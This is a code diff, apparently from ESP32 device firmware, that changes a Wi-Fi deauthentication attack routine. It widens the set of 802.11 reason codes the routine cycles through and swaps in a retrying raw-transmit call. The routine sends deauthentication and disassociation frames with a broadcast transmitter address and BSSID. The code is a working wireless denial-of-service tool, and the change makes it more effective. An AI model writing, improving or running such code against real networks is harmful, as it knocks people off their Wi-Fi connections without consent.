@@ -19,7 +19,8 @@ static const uint8_t sd_deauth_tmpl[26] = {
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
     0x00, 0x00, 0x02, 0x00,
 };
-static const uint8_t sd_deauth_reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08};
+static const uint8_t sd_deauth_reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08,
+                                            0x0a, 0x0d, 0x0f, 0x12, 0x28};
 static const uint8_t sd_broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
 // Shared state between task and scene
@@ -38,11 +39,11 @@ static void sd_tx_deauth(uint8_t channel) {
     memcpy(f, sd_deauth_tmpl, 26);
     memcpy(&f[10], sd_broadcast, 6); // TA = broadcast
     memcpy(&f[16], sd_broadcast, 6); // BSSID = broadcast
-    uint8_t reason = sd_deauth_reasons[sd_frames % 5];
+    uint8_t reason = sd_deauth_reasons[sd_frames % sizeof(sd_deauth_reasons)];
     f[24] = reason;
-    if(esp_wifi_80211_tx(WIFI_IF_STA, f, 26, true) == ESP_OK) sd_frames++;
+    if(wlan_hal_raw_tx_retry(f, 26)) sd_frames++;
     f[0] = 0xa0; // Disassoc
-    if(esp_wifi_80211_tx(WIFI_IF_STA, f, 26, true) == ESP_OK) sd_frames++;
+    if(wlan_hal_raw_tx_retry(f, 26)) sd_frames++;
 }
 
 static void sd_task_fn(void* arg) {
